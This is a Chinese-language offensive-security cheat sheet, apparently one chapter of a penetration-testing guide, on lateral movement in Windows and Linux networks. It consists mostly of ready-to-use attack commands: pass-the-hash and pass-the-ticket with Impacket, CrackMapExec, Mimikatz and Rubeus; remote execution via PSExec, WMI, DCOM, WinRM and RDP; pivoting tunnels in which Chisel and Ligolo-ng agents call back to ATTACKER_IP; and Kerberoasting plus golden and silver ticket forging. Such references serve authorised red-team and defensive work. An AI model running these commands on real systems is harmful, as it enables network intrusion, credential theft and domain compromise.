# ➡️ 阶段 4：横向移动（Lateral Movement）

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](./04-Lateral-Movement.tr.md) • [🇬🇷 Ελληνικά](./04-Lateral-Movement.el.md)

```
  ██╗      █████╗ ████████╗███████╗██████╗  █████╗ ██╗     
  ██║     ██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██║     
  ██║     ███████║   ██║   █████╗  ██████╔╝███████║██║     
  ██║     ██╔══██║   ██║   ██╔══╝  ██╔══██╗██╔══██║██║     
  ███████╗██║  ██║   ██║   ███████╗██║  ██║██║  ██║███████╗
  ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
        ███╗   ███╗ ██████╗ ██╗   ██╗███████╗███╗   ███╗███████╗███╗   ██╗████████╗
        ████╗ ████║██╔═══██╗██║   ██║██╔════╝████╗ ████║██╔════╝████╗  ██║╚══██╔══╝
        ██╔████╔██║██║   ██║██║   ██║█████╗  ██╔████╔██║█████╗  ██╔██╗ ██║   ██║   
        ██║╚██╔╝██║██║   ██║╚██╗ ██╔╝██╔══╝  ██║╚██╔╝██║██╔══╝  ██║╚██╗██║   ██║   
        ██║ ╚═╝ ██║╚██████╔╝ ╚████╔╝ ███████╗██║ ╚═╝ ██║███████╗██║ ╚████║   ██║   
        ╚═╝     ╚═╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   
```

**目标：** 从已入侵系统移动到网络中的其他系统。

> **译注：** 端口表是简化参考；WMI/DCOM 除 TCP 135 的端点映射外，通常还涉及 RPC 动态端口。WinRM 的授权不只取决于是否为管理员，还取决于端点及会话权限。跳板示例省略了部分路由、接口或代理配置；“更隐蔽”并不代表不会产生检测信号。

---

## 🔑 基于凭据的横向移动

### 哈希传递（Pass-the-Hash，PTH）
```bash
# Impacket PSExec 使用哈希
impacket-psexec -hashes :NTLM_HASH administrator@192.168.1.10

# Impacket WMIExec
impacket-wmiexec -hashes :NTLM_HASH administrator@192.168.1.10

# Impacket SMBExec
impacket-smbexec -hashes :NTLM_HASH administrator@192.168.1.10

# CrackMapExec
crackmapexec smb 192.168.1.10 -u administrator -H NTLM_HASH
crackmapexec smb 192.168.1.10 -u administrator -H NTLM_HASH -x "whoami"

# Evil-WinRM
evil-winrm -i 192.168.1.10 -u administrator -H NTLM_HASH
```

### 票据传递（Pass-the-Ticket，PTT）
```powershell
# 从内存导出票据（Mimikatz）
sekurlsa::tickets /export

# 导入票据
kerberos::ptt ticket.kirbi

# 或使用 Rubeus
.\Rubeus.exe ptt /ticket:BASE64_TICKET

# 验证票据
klist
```

### 利用哈希申请票据（Overpass-the-Hash / Pass-the-Key）
```powershell
# Mimikatz：使用 NTLM 哈希请求 TGT
sekurlsa::pth /user:administrator /domain:domain.local /ntlm:HASH /run:cmd

# Rubeus
.\Rubeus.exe asktgt /user:administrator /rc4:NTLM_HASH /ptt
```

### 证书传递（Pass-the-Certificate）
```bash
# 使用证书进行身份验证
certipy auth -pfx admin.pfx -dc-ip 192.168.1.1

# 使用 Rubeus
.\Rubeus.exe asktgt /user:admin /certificate:admin.pfx /ptt
```

---

## 🖥️ 远程执行方法

### PSExec
```bash
# Impacket PSExec
impacket-psexec domain/administrator:password@192.168.1.10
impacket-psexec -hashes :HASH administrator@192.168.1.10

# Metasploit PSExec
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.10
set SMBUser administrator
set SMBPass password
run
```

### WMIExec
```bash
# Impacket WMIExec（原文称其更隐蔽）
impacket-wmiexec domain/administrator:password@192.168.1.10
impacket-wmiexec -hashes :HASH administrator@192.168.1.10

# PowerShell WMI
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami > C:\temp\out.txt" -ComputerName 192.168.1.10 -Credential $cred
```

### WinRM / Evil-WinRM
```bash
# Evil-WinRM 使用密码
evil-winrm -i 192.168.1.10 -u administrator -p 'password'

# Evil-WinRM 使用哈希
evil-winrm -i 192.168.1.10 -u administrator -H NTLM_HASH

# PowerShell 远程处理
Enter-PSSession -ComputerName 192.168.1.10 -Credential $cred
Invoke-Command -ComputerName 192.168.1.10 -Credential $cred -ScriptBlock { whoami }
```

### DCOM
```bash
# Impacket DCOM
impacket-dcomexec domain/administrator:password@192.168.1.10

# PowerShell DCOM
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.1.10"))
$com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```

### SMB
```bash
# CrackMapExec 命令执行
crackmapexec smb 192.168.1.10 -u admin -p password -x "whoami"
crackmapexec smb 192.168.1.10 -u admin -p password -X "Get-Process"  # PowerShell

# 通过 SMB 复制文件
smbclient //192.168.1.10/C$ -U administrator
put shell.exe

# PsExec 风格
crackmapexec smb 192.168.1.10 -u admin -p password --exec-method smbexec -x "whoami"
```

### RDP
```bash
# xfreerdp
xfreerdp /v:192.168.1.10 /u:administrator /p:password /dynamic-resolution

# 使用 NTLM 哈希（受限管理员模式）
xfreerdp /v:192.168.1.10 /u:administrator /pth:NTLM_HASH

# 远程启用 RDP
crackmapexec smb 192.168.1.10 -u admin -p password -M rdp -o ACTION=enable
```

### SSH (Linux)
```bash
# 使用密码连接 SSH
ssh user@192.168.1.10

# 使用密钥连接 SSH
ssh -i id_rsa user@192.168.1.10

# SSH 隧道与跳板
ssh -D 9050 user@192.168.1.10  # SOCKS 代理
ssh -L 8080:internal:80 user@192.168.1.10  # 本地端口转发
```

---

## 🔄 网络跳板（Pivoting）

### SSH 隧道
```bash
# 本地端口转发（通过 localhost:8080 访问 internal:80）
ssh -L 8080:192.168.2.10:80 user@192.168.1.10

# 动态 SOCKS 代理
ssh -D 9050 user@192.168.1.10
proxychains nmap 192.168.2.0/24

# 远程端口转发
ssh -R 4444:localhost:4444 user@192.168.1.10
```

### Chisel
```bash
# 在攻击机上（服务端）
./chisel server --reverse --port 8080

# 在目标机上（客户端）
./chisel client ATTACKER_IP:8080 R:socks

# 配合 proxychains 使用
proxychains nmap 192.168.2.10
```

### Ligolo-ng
```bash
# 在攻击机上
./proxy -selfcert

# 在目标机上
./agent -connect ATTACKER_IP:11601 -ignore-cert

# 在代理控制台中
session
start
```

### Metasploit 跳板
```bash
# 添加经由 Meterpreter 会话的路由
run autoroute -s 192.168.2.0/24

# 或手动添加
route add 192.168.2.0 255.255.255.0 1

# SOCKS 代理
use auxiliary/server/socks_proxy
set SRVPORT 9050
run -j
```

---

## 🎫 Kerberos 攻击

### Kerberoasting（服务票据离线破解）
```bash
# 获取服务票据
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.1 -request

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# 使用 hashcat 破解
hashcat -m 13100 hashes.txt wordlist.txt
```

### AS-REP Roasting（无需预身份验证的账户离线破解）
```bash
# 查找无需预身份验证的用户
GetNPUsers.py domain.local/ -no-pass -usersfile users.txt -dc-ip 192.168.1.1

# 破解
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

### 黄金票据（Golden Ticket）
```powershell
# 先获取 krbtgt 哈希，然后：
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt
```

### 白银票据（Silver Ticket）
```powershell
# 为指定服务创建票据
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt
```

---

## 📊 快速参考

### 横向移动技术

| 技术 | 端口 | 工具 |
|-----------|------|------|
| PSExec | 445/SMB | impacket, metasploit |
| WMIExec | 135/WMI | impacket |
| WinRM | 5985/5986 | evil-winrm |
| RDP | 3389 | xfreerdp |
| SSH | 22 | ssh |
| DCOM | 135+ | impacket |

### 所需凭据

| 方法 | 要求 |
|--------|-------------|
| Pass-the-Hash | NTLM 哈希 |
| Pass-the-Ticket | Kerberos 票据 |
| PSExec | 管理员权限与 SMB 访问权限 |
| WinRM | 启用 WinRM，并具备管理员权限 |
| RDP | 启用 RDP，并属于允许远程桌面访问的组 |

---

## 🔗 相关速查表

- [Impacket](../../Impacket/README.md)
- [CrackMapExec](../../CrackMapExec/README.md)
- [Evil-WinRM](../../Evil-WinRM/README.md)
- [Mimikatz](../../Mimikatz/README.md)
- [Rubeus](../../Rubeus/README.md)

---

**上一阶段：** [← 03 - 权限提升](./03-Privilege-Escalation.zh-CN.md)

**下一阶段：** [05 - 持久化 →](./05-Persistence.zh-CN.md)
